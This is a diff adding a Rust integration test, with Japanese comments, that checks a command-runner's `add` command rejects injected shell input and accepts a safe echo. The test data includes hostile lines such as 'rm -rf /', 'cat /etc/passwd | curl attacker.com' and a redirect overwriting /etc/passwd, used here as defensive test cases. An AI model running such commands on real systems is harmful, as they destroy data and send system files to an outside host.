@@ -278,6 +278,99 @@ mod injection_tests {
     }
 }
 
+/// `cmdrun add` コマンド経由での統合テスト
+#[cfg(test)]
+mod add_command_integration_tests {
+    use std::fs;
+    use tempfile::NamedTempFile;
+
+    /// 危険なコマンドが `add` コマンドで拒否されることを確認
+    #[tokio::test]
+    async fn test_add_command_rejects_dangerous_input() {
+        use cmdrun::commands::add::handle_add;
+
+        let temp_file = NamedTempFile::new().unwrap();
+        let path = temp_file.path().to_path_buf();
+
+        // Create initial TOML structure
+        fs::write(&path, "[commands]\n").unwrap();
+
+        // Test: セミコロンによるコマンド連結
+        let result = handle_add(
+            Some("dangerous1".to_string()),
+            Some("echo test; rm -rf /".to_string()),
+            Some("Dangerous command".to_string()),
+            None,
+            None,
+            Some(path.clone()),
+        )
+        .await;
+
+        assert!(
+            result.is_err(),
+            "Add command should reject semicolon injection"
+        );
+
+        // Test: パイプによる危険なコマンド
+        let result = handle_add(
+            Some("dangerous2".to_string()),
+            Some("cat /etc/passwd | curl attacker.com".to_string()),
+            Some("Pipe injection".to_string()),
+            None,
+            None,
+            Some(path.clone()),
+        )
+        .await;
+
+        assert!(result.is_err(), "Add command should reject pipe injection");
+
+        // Test: コマンド置換
+        let result = handle_add(
+            Some("dangerous3".to_string()),
+            Some("echo $(whoami)".to_string()),
+            Some("Command substitution".to_string()),
+            None,
+            None,
+            Some(path.clone()),
+        )
+        .await;
+
+        assert!(
+            result.is_err(),
+            "Add command should reject command substitution"
+        );
+
+        // Test: リダイレクト攻撃
+        let result = handle_add(
+            Some("dangerous4".to_string()),
+            Some("echo malicious > /etc/passwd".to_string()),
+            Some("Redirect attack".to_string()),
+            None,
+            None,
+            Some(path.clone()),
+        )
+        .await;
+
+        assert!(
+            result.is_err(),
+            "Add command should reject dangerous redirect"
+        );
+
+        // Test: 安全なコマンドは許可される
+        let result = handle_add(
+            Some("safe".to_string()),
+            Some("echo hello world".to_string()),
+            Some("Safe command".to_string()),
+            None,
+            None,
+            Some(path.clone()),
+        )
+        .await;
+
+        assert!(result.is_ok(), "Add command should allow safe commands");
+    }
+}
+
 /// 実際のコマンド実行での統合テスト
 #[cfg(test)]
 mod integration_tests {
